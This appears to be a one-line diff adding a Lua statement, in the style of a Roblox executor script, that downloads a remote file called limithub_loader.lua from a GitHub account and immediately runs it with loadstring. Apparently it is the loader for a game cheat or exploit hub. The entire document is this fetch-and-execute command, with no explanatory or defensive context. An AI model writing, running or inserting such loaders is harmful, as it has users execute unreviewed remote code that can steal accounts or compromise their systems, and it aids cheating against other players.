@@ -1,0 +1,1 @@
+loadstring(game:httpget(('https://raw.githubusercontent.com/fakemodz/limithub/refs/heads/main/limithub_loader.lua')))()
